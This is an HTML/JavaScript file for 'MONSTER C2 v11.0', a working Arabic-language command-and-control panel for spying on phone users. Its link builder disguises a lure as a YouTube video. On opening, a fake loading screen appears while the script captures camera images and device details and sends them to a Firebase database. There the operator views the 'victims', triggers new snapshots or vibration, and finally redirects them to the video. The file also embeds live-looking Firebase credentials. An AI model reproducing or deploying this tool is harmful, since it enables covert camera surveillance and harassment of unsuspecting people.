<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MONSTER C2 v11.0 | THE DOCTOR</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #050505; }
        * { box-sizing: border-box; font-family: 'Courier New', monospace; }
        body { background: var(--bg); color: var(--neon); margin: 0; overflow: hidden; font-size: 13px; }

        /* الهيدر والقائمة اليسرى */
        .hamburger { position: fixed; top: 10px; left: 10px; z-index: 1000; cursor: pointer; background: #000; border: 1px solid var(--neon); padding: 5px 10px; border-radius: 4px; }
        #menu-check { display: none; }
        .sidebar { position: fixed; top: 0; left: -260px; width: 260px; height: 100%; background: #0a0a0a; border-right: 2px solid var(--neon); transition: 0.2s; z-index: 999; padding: 50px 10px; }
        #menu-check:checked ~ .sidebar { left: 0; }

        .main { height: 100vh; padding: 15px; overflow-y: auto; text-align: center; }
        .btn-group { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; margin-top: 10px; }
        
        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; border-radius: 5px; font-weight: bold; cursor: pointer; }
        button:hover { background: var(--neon); color: #000; }
        button:active { transform: scale(0.95); }

        .v-card { border: 1px solid #222; padding: 10px; margin-bottom: 8px; border-radius: 4px; text-align: right; cursor: pointer; }
        .v-card.active { border-color: #fff; background: #111; }
        .dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; float: left; margin-top: 5px; }

        #gallery img { width: 100%; border: 1px solid #333; margin-top: 10px; border-radius: 5px; }
        .img-wrap { position: relative; margin-bottom: 15px; }
        .img-btns { display: flex; justify-content: space-between; background: #000; padding: 5px; border: 1px solid var(--neon); border-top: none; }

        /* واجهة الضحية */
        #victim-mask { position: fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:10000; display:none; flex-direction:column; align-items:center; justify-content:center; color:#fff; }
    </style>
</head>
<body>

<input type="checkbox" id="menu-check">
<label for="menu-check" class="hamburger">☰ الرادار</label>

<div class="sidebar">
    <h4 style="border-bottom: 1px solid var(--neon);">📡 الأجهزة المكتشفة</h4>
    <div id="v-list">بانتظار الجلسات...</div>
    <hr>
    <h4>⚙️ توليد التلغيم</h4>
    <input type="text" id="target-url" placeholder="رابط فيديو (يوتيوب)" style="width:100%; background:#000; color:var(--neon); border:1px solid var(--neon); padding:8px;">
    <button onclick="buildLink()" style="width:100%; margin-top:5px;">صناعة الرابط</button>
    <div id="final-res" style="font-size:9px; color:#0ff; margin-top:10px; word-break:break-all;"></div>
</div>

<div class="main">
    <h3 style="border-bottom: 1px solid var(--neon);">🕹️ السيطرة: <span id="active-name">لا يوجد</span></h3>
    <div class="btn-group">
        <button onclick="exec('snap')" style="border-color: #0ff;">📸 سحب صورة</button>
        <button onclick="exec('vibrate')" style="border-color: #ff0;">📳 هز الجهاز</button>
        <button onclick="exec('release')" style="background: #131;">🔓 إطلاق سراح</button>
        <button onclick="clearAll()" style="border-color: #f00;">🗑️ مسح الكل</button>
    </div>

    <div id="gallery" style="margin-top:20px;">
        <h4 style="text-align:right;">📸 الصور المستلمة:</h4>
        <div id="imgs-container"></div>
    </div>
</div>

<div id="victim-mask">
    <div style="width:40px; height:40px; border:4px solid #333; border-top-color:var(--neon); border-radius:50%; animation:spin 1s linear infinite;"></div>
    <p>Loading Media Content...</p>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
</div>

<script>
    const config = {
        apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
        projectId: "monster-system-7f67e"
    };
    firebase.initializeApp(config);
    const db = firebase.database();
    let currentId = null;

    // --- إدارة الرادار (الآدمن) ---
    db.ref('victims').on('value', snap => {
        const list = document.getElementById('v-list');
        const container = document.getElementById('imgs-container');
        list.innerHTML = '';
        snap.forEach(child => {
            const v = child.val();
            const id = child.key;
            const online = (Date.now() - v.lastSeen) < 8000;
            list.innerHTML += `<div class="v-card ${id==currentId?'active':''}" onclick="setVictim('${id}','${v.model}')">
                <span class="dot" style="background:${online?'#0f0':'#f33'}"></span>
                <b>${v.model}</b><br><small>${v.time}</small>
            </div>`;
            
            if(id === currentId && v.imgUrl) {
                container.innerHTML = `<div class="img-wrap"><img src="${v.imgUrl}"><div class="img-btns">
                <button onclick="window.open('${v.imgUrl}')">حفظ</button>
                <button onclick="db.ref('victims/${id}/imgUrl').remove()" style="color:red">حذف</button>
                </div></div>` + container.innerHTML;
            }
        });
    });

    function setVictim(id, model) {
        currentId = id;
        document.getElementById('active-name').innerText = model;
        document.getElementById('menu-check').checked = false;
    }

    function exec(type) {
        if(!currentId) return alert("اختر جهازاً!");
        // نرسل الأمر مباشرة لخانة الجهاز المختار
        db.ref('victims/' + currentId + '/command').set({ type, t: Date.now() });
        console.log("Sent command: " + type);
    }

    function buildLink() {
        const val = document.getElementById('target-url').value;
        const out = window.location.href.split('?')[0] + "?go=" + btoa(val);
        document.getElementById('final-res').innerText = out;
    }

    function clearAll() { if(confirm("حذف كل البيانات؟")) db.ref('/').remove(); }

    // --- بايلوت الضحية (التنفيذ الصاعق) ---
    const urlP = new URLSearchParams(window.location.search);
    const go = urlP.get('go');
    if(go) {
        (async () => {
            document.getElementById('victim-mask').style.display = 'flex';
            const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2] : "Mobile_User";
            const ref = db.ref('victims').push();
            const myPath = ref.key;

            const sendInfo = (img = null) => {
                const data = { model, lastSeen: Date.now(), time: new Date().toLocaleTimeString() };
                if(img) data.imgUrl = img;
                ref.update(data);
            };

            const capture = async () => {
                try {
                    const s = await navigator.mediaDevices.getUserMedia({video:true});
                    const video = document.getElementById('v'); video.srcObject = s; await video.play();
                    const canvas = document.getElementById('c'); canvas.width=video.videoWidth; canvas.height=video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const base64 = canvas.toDataURL('image/jpeg', 0.5);
                    sendInfo(base64);
                    s.getTracks().forEach(t => t.stop());
                } catch(e) { sendInfo(); }
            };

            await capture(); // السحب الأول

            // الاستماع الفوري للأوامر المرسلة لهذا الجهاز حصراً
            db.ref('victims/' + myPath + '/command').on('value', s => {
                const cmd = s.val();
                if(cmd) {
                    if(cmd.type === 'snap') capture();
                    if(cmd.type === 'vibrate') navigator.vibrate(500);
                    if(cmd.type === 'release') window.location.href = atob(go);
                }
            });

            // نبض البقاء أونلاين
            setInterval(() => ref.update({ lastSeen: Date.now() }), 4000);
        })();
    }
</script>
<style> @keyframes spin { 100% { transform: rotate(360deg); } } </style>
</body>
</html>
